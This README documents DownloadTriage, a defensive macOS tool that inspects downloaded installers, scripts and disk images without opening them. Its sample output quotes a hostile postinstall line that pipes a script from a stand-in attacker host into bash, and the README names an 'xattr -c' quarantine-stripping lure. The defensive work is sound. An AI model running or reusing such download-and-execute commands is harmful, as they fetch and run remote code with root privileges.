# DownloadTriage

**"I downloaded this. Should I open it?"**

Read-only inspection of what is sitting in your Downloads folder, *before* you
double-click it. Nothing is opened, mounted, installed, or executed.

```sh
./downloadtriage.zsh                # ~/Downloads, last 30 days
./downloadtriage.zsh <file|dir>     # one thing
./downloadtriage.zsh --all          # no date filter
./downloadtriage.zsh --mount        # allow DMG mounting for deep inspection
./downloadtriage.zsh --json         # machine-readable
```

Exit `0` nothing notable · `2` something wants your attention.

---

## Why this exists

ShellGuard guards the shell prompt. That is **one** execution path, and macOS has
many. None of these ever touch a zsh prompt, so none of them can be stopped at
`accept-line`:

- a double-clicked `.command` or `.terminal` — opens Terminal and runs
- a `.pkg` whose `preinstall`/`postinstall` script runs **as root**
- an `.app` inside a mounted DMG
- a `.scpt` that opens in Script Editor

This closes the **deliver** stage of the kill chain, which the rest of the kit
did not cover.

## The `.pkg` case is the important one

An installer package can carry `preinstall` and `postinstall` scripts, and
**those run as root**. The user is *conditioned* to type an admin password into
Installer.app — it looks exactly like every legitimate install they have ever
done.

This is why GuestMode's framing ("a phished password can't escalate") does not
help here: the escalation is the installer's documented behaviour, not an
exploit.

So DownloadTriage expands the package with `pkgutil --expand-full` and runs its
install scripts through **the same grammar that guards your shell prompt**
(`../lib/clickfix-grammar.zsh`). If the script would have been blocked at your
terminal, it gets flagged in the installer too — and you are shown the script.

```
[!] Hostile-Installer.pkg
    quarantine ABSENT   gatekeeper REJECTED   signer unsigned
    • Its install script matches a download-and-execute pattern — and .pkg
      scripts run as ROOT.
    --- install script ---
    postinstall:block
      REASONS:Downloads code from the internet and pipes it straight into bash
      --- script contents ---
      #!/bin/bash
      curl -fsSL https://evil.test/stage2.sh | bash
```

`pkgutil --expand-full` unpacks. It does not run anything. There is a test that
asserts exactly this: a fixture package whose `postinstall` would create a marker
file, and the marker never appears.

## What it reports

| Fact | Why it matters |
|---|---|
| **Quarantine attribute** | Gatekeeper only inspects files carrying `com.apple.quarantine`. **ABSENT** on something executable means Gatekeeper will not check it at all — either it did not arrive through a browser, or the flag was stripped (`xattr -c` is a documented step in "the app is damaged, right-click Open" lures). |
| **Origin URL** | From `kMDItemWhereFroms`. The single most useful fact about a download, and invisible in `ls`. Checked against the grammar's known malware-staging hosts. |
| **Gatekeeper verdict + signer** | For file types Gatekeeper actually judges — see below. |
| **Install scripts** | For `.pkg`/`.mpkg`, run through the shared grammar. |
| **Script contents** | For `.command`, `.terminal`, `.sh` — read and run through the grammar. |

## What it deliberately does *not* judge

This matters as much as what it flags. An early build reported the **official
Signal installer as "REJECTED — unsigned"**, because `spctl -a` with no type
argument assumes an executable. A tool that tells you Signal is unsigned is worse
than no tool, so:

- **`.dmg`** — the signature lives on the `.app` *inside* the image. Assessing
  the image itself returns "no usable signature" for legitimate installers, so
  no verdict is rendered. Use `--mount` to inspect the contents.
- **`.zip` / `.tar` / `.gz`** — archives are not signed. Never assessed.
- **`.sh` / `.command` / plain text** — not signed. They are **read** instead.
- **`.pkg`** — assessed with `-t install`, which is the correct context.

Only `.app`, `.pkg`, and Mach-O binaries get a Gatekeeper verdict.

## DMGs are not mounted by default

Mounting a disk image is itself a step in current macOS stealer campaigns, so
`--mount` is opt-in. Without it you get everything except the inner signature.

## Prior art, honestly

- **[Objective-See](https://objective-see.org)** — `WhatsYourSign` adds signing
  info to Finder's right-click menu and is the better everyday tool for
  "who signed this?". Install it.
- **`spctl` / `codesign` / `xattr`** ship with macOS and are what this shells out
  to. Nothing here is a new detection primitive.

The additive part is narrow and specific: **expanding a `.pkg` and running its
root-privileged install scripts through the same ClickFix grammar that guards
the shell prompt.** Nothing else in the kit — or, as far as I can find, in the
consumer tooling — connects those two things.

## Permissions

None. No Full Disk Access, no root, no network. It reads file metadata and
unpacks archives into a temp directory it deletes afterwards.
